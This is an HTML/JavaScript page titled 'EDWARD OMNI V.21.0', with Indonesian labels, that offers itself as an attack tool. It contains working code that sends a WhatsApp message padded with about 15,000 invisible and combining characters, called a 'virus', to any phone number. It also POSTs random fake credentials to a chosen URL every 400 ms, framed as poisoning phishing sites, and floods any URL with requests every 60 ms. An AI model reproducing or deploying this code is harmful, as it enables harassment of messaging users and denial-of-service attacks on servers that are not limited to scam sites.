<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>[ EDWARD OMNI V.21.0 ]</title>
    <style>
        :root { --neon: #0f0; --purple: #bc13fe; --danger: #f00; --bg: #050505; }
        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; text-align: center; padding: 15px; margin:0; }
        .panel { background: #111; border: 2px solid #333; padding: 15px; border-radius: 15px; margin-bottom: 10px; border-left: 4px solid var(--purple); }
        input { background: #000; border: 1px solid var(--purple); color: #fff; padding: 12px; width: 85%; border-radius: 8px; margin-bottom: 8px; text-align: center; outline: none; font-size: 12px; }
        button { background: var(--purple); color: #fff; border: none; padding: 12px; width: 90%; font-weight: bold; cursor: pointer; border-radius: 8px; text-transform: uppercase; margin: 3px 0; font-size: 11px; }
        .btn-wa { background: #25D366; color: #000; }
        .log-box { font-size: 9px; color: #0f0; background: #000; padding: 10px; border-radius: 5px; height: 100px; overflow-y: hidden; text-align: left; border: 1px solid #222; margin-top: 5px; }
        #statusTeks { color: var(--danger); font-size: 10px; font-weight: bold; height: 15px; }
    </style>
</head>
<body>

    <h1 style="color:var(--purple); text-shadow: 0 0 10px var(--purple); margin: 0;">EDWARD V.21.0</h1>
    <p id="statusTeks"></p>

    <div class="panel" style="border-left-color: #25D366;">
        <h3 style="margin:0; color:#25D366; font-size: 13px;">🟢 WHATSAPP SPAMMER</h3>
        <input type="number" id="noWA" placeholder="628xxxxxxx">
        <button onclick="startSpamWA()" class="btn-wa">KIRIM VIRUS SPAM 😈</button>
    </div>

    <div class="panel">
        <h3 style="margin:0; color:var(--purple); font-size: 13px;">🟣 PHISHING & SERVER</h3>
        <input type="text" id="targetUrl" placeholder="URL Web Penipu / Server">
        <div style="display: flex; gap: 5px; justify-content: center;">
            <button onclick="startPoison()" style="width: 48%;">POISON DATA</button>
            <button onclick="startFlood()" style="background:var(--danger); width: 48%;">FLOOD SERVER</button>
        </div>
    </div>

    <div class="log-box" id="logBox">> System V.21.0 Ready...</div>
    <button onclick="location.reload()" style="background:#222; width:40%; margin-top:10px;">RESET</button>

    <script>
        const log = document.getElementById('logBox');
        const st = document.getElementById('statusTeks');
        
        function addLog(msg) {
            log.innerHTML += "> " + msg + "<br>";
            log.scrollTop = log.scrollHeight;
        }

        function showStatus(txt) {
            st.innerHTML = txt;
            setTimeout(() => { st.innerHTML = ""; }, 3000);
        }

        // 🟢 FITUR WA SPAM (Kembali Lagi!)
        function startSpamWA() {
            let n = document.getElementById('noWA').value;
            if(!n) return showStatus("MASUKKAN NOMOR WA!");
            
            let virus = "‌".repeat(10000) + " 😈_EDWARD_V21_SPAM_😈 " + "ॣ".repeat(5000);
            navigator.clipboard.writeText(virus);
            
            addLog("Virus copied to clipboard!");
            addLog("Redirecting to WhatsApp...");
            
            setTimeout(() => {
                window.location.href = "https://api.whatsapp.com/send?phone=" + n + "&text=" + encodeURIComponent(virus);
            }, 1000);
        }

        function startPoison() {
            let url = document.getElementById('targetUrl').value;
            if(!url) return showStatus("MASUKKAN URL TARGET!");
            if(!url.startsWith('http')) url = 'https://' + url;
            addLog("Poisoning: " + url);
            setInterval(() => {
                const u = "user_" + Math.random().toString(36).substring(7);
                const p = "pass_" + Math.random().toString(36).substring(5);
                fetch(url, { method: 'POST', mode: 'no-cors', body: new URLSearchParams({'u':u,'p':p}) });
                addLog("Injecting: " + u);
            }, 400);
        }

        function startFlood() {
            let url = document.getElementById('targetUrl').value;
            if(!url) return showStatus("MASUKKAN URL TARGET!");
            if(!url.startsWith('http')) url = 'https://' + url;
            addLog("Flooding: " + url);
            setInterval(() => {
                fetch(url + "/?edward=" + Math.random(), { mode: 'no-cors' });
                addLog("Packet Sent...");
            }, 60);
        }
    </script>
</body>
</html>
